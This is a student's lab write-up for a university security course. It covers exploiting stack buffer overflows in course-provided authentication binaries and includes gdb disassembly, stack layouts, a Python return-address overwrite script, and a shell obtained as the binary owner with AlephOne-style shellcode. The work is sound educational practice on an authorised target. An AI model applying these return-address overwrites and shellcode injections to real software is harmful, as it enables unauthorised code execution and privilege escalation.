Vincent Chang
6430136
v_chang@umail.ucsb.edu

/*************************
* Task 1 - Buf. Overflow *
*************************/

Secret word: CSS177isawesome

1.) Read the AlephOne tutorial.
    Under the impression I observe control flow with gdb
      in order to answer question a.
      
a.) What is the address of the first instruction inside main executed
      if the output of authenticate is indeed 0?
      
      0x08048652
      
    Relevant portion of gdb assembly dump:
    
    ...
     0x08048649 <+52>:    call   0x80485ad <authenticate>       // Call to authenticate
     0x0804864e <+57>:    test   %eax,%eax                      // else if check
     0x08048650 <+59>:    jne    0x80486b4 <main+159>           // jump if not zero
     0x08048652 <+61>:    movl   $0x80487bf,(%esp)              // Continues here if zero
     0x08048659 <+68>:    call   0x8048460 <puts@plt>           // Call to puts (for printf)
     0x0804865e <+73>:    movl   $0x8048760,0x4(%esp)
     0x08048666 <+81>:    movl   $0x80487c8,(%esp)
     0x0804866d <+88>:    call   0x80484a0 <fopen@plt>          // call to fopen
    ...

    Want to skip to that address in code so it runs all the way to 0x08048728,
      where the secret word printf statement is. 
      
    Jump from 0x08048649 to 0x08048652
  

  
ls -l on /home/mr177/bin reveals that the program is able to be run by anyone.

  
b.) Where are the relevant accessible portions of the stack within authenticate,
      in particular with respect to the position of the stored return pointer?
   
    We can exploit buf in order to attempt to overwrite the return pointer
      so that it runs starting at the above address.
   

* Little Endian *
bottom of                                                            top of
memory                                                               memory
                tmp           buf           sfp   ret   *password
<------        [123456789012][123456789012][1234][1234][1234]
                123456789012  345678901234  5678
top of                                                            bottom of
stack                                                                 stack




/****** Attempts: *******/

$ /home/mr177/bin/auth 123456789012340x08048652
Access Denied!
$ /home/mr177/bin/auth 12345678901212340x08048652
Segmentation fault (core dumped)

At this point, I think I'm successfully overwriting the return pointer.
  But it's pointing to some place off memory. But using "0x08048652" will
  actually fill up ret with the ASCII values, not the address. 

""" From Piazza
To set up your return address, you can use "\x52\x86\x04\x08" from C or Python.
Note that we use little-endian.
The point here is to make sure your return address is interpreted correctly.
"""


Took a while to finesse the correct padding, but I ended up using:
```
cmd = '/home/mr177/bin/auth 1234567890123456789012345'+"\x52"+"\x86"+"\x04"+"\x08"
print cmd
os.system(cmd)
```

$ python exploit1.py
/home/mr177/bin/auth 1234567890123456789012345R
Success!
The secret word is: CSS177isawesome
Turns out my idea of the padding was incorrect, but it works, so it's fine.







/*********************
* Task 2 - Shellcode *
*********************/

Tutorial states we need to fill the buffer with shellcode and then
  have the return address point back to the beginning of the shell-
  code.
The shellcode will be placed in buf, which 
  


bottom of                                                            top of
memory                                                               memory
                99999999AAAA  AAA  ..  FFF  FFFF  FFFF  FFFF
                89ABCDEF0123  456  ..  123  4567  89AB  CDEF
                tmp           buf           sfp   ret   *password
<------        [123456789012][  80 bytes  ][1234][1234][1234]
top of                              |                             bottom of
stack                               |                                 stack
                                    V
AAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEFFFF
456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123
         1         2         3         4         5         6         7         8
12345678901234567890123456789012345678901234567890123456789012345678901234567890



Attempted to use AlephOne's exploit2.c and exploit3.c. No success.
  Difficulty is I'm not sure what I'm looking for. Exploit3.c should have
  made it a lot easier, but seemed to be as effective as exploit2.c (not
  at all.

v_chang@tessaro:~/working/a1$ ./exploit2
Using address: 0xbffffc38

Does this tell us the return address?

Attempted to write a python script that would run AlephOne's exploit2.c with differing
  offsets and buffers then run auth2, but always halted after 1 command.
  Might need to look into subprocess library.
  
Turns out I opened a new shell every time I used one of the exploits, which
  is why it halted after 1 command.


Writing a C program that attempts to fill the buffer manually with noops 
  and shellcode.  

Realized there was exploit4 (e4) in the AlephOne tutorial and started using that.
  Attempted to manually run exploit4 with varying offsets, being sure to exit
  out of the shell after every time in increments of 10.
Luckily randomly obtained it after trying no offset, since stackcheck (sc)
  returned an address close to running exploit4 with no offset.


v_chang@tessaro:~/working$ ./sc
0xbffffc78
v_chang@tessaro:~/working$ ./e4
Using address: 0xbffffc48
v_chang@tessaro:~/working$ /home/mr177/bin/auth2 $RET
$ whoami
mr177
$ cd /home/mr177/visitors
$ touch VincentChang


Left a file with my first and last name.




 
APPENDIX A: Dump for /home/mr177/bin/auth
 
 Dump of assembler code for function main:
   0x08048615 <+0>:     push   %ebp
   0x08048616 <+1>:     mov    %esp,%ebp
   0x08048618 <+3>:     and    $0xfffffff0,%esp
   0x0804861b <+6>:     sub    $0x40,%esp
   0x0804861e <+9>:     cmpl   $0x2,0x8(%ebp)
   0x08048622 <+13>:    je     0x804863e <main+41>
   0x08048624 <+15>:    mov    0xc(%ebp),%eax
   0x08048627 <+18>:    mov    (%eax),%eax
   0x08048629 <+20>:    mov    %eax,0x4(%esp)
   0x0804862d <+24>:    movl   $0x8048784,(%esp)
   0x08048634 <+31>:    call   0x8048420 <printf@plt>
   0x08048639 <+36>:    jmp    0x80486c0 <main+171>
   0x0804863e <+41>:    mov    0xc(%ebp),%eax
   0x08048641 <+44>:    add    $0x4,%eax
   0x08048644 <+47>:    mov    (%eax),%eax
   0x08048646 <+49>:    mov    %eax,(%esp)
   0x08048649 <+52>:    call   0x80485ad <authenticate>       // Call to authenticate
   0x0804864e <+57>:    test   %eax,%eax                      // else if check
   0x08048650 <+59>:    jne    0x80486b4 <main+159>           // jump if not zero
   0x08048652 <+61>:    movl   $0x80487bf,(%esp)              // Continues here if zero
   0x08048659 <+68>:    call   0x8048460 <puts@plt>           // Call to puts (for printf)
   0x0804865e <+73>:    movl   $0x8048760,0x4(%esp)
   0x08048666 <+81>:    movl   $0x80487c8,(%esp)
   0x0804866d <+88>:    call   0x80484a0 <fopen@plt>          // call to fopen
   0x08048672 <+93>:    mov    %eax,0x3c(%esp)
   0x08048676 <+97>:    lea    0x1c(%esp),%eax
   0x0804867a <+101>:   mov    %eax,0x8(%esp)
   0x0804867e <+105>:   movl   $0x804877f,0x4(%esp)
   0x08048686 <+113>:   mov    0x3c(%esp),%eax
   0x0804868a <+117>:   mov    %eax,(%esp)
   0x0804868d <+120>:   call   0x8048430 <__isoc99_fscanf@plt>
   0x08048692 <+125>:   lea    0x1c(%esp),%eax
   0x08048696 <+129>:   mov    %eax,0x4(%esp)
   0x0804869a <+133>:   movl   $0x80487e3,(%esp)
   0x080486a1 <+140>:   call   0x8048420 <printf@plt>         // Prints the secret word
   0x080486a6 <+145>:   mov    0x3c(%esp),%eax
   0x080486aa <+149>:   mov    %eax,(%esp)
   0x080486ad <+152>:   call   0x8048440 <fclose@plt>         // Closes the file
   0x080486b2 <+157>:   jmp    0x80486c0 <main+171>
   0x080486b4 <+159>:   movl   $0x80487fb,(%esp)
   0x080486bb <+166>:   call   0x8048460 <puts@plt>           // Puts "access denied"
   0x080486c0 <+171>:   movl   $0x0,(%esp)
   0x080486c7 <+178>:   call   0x8048480 <exit@plt>
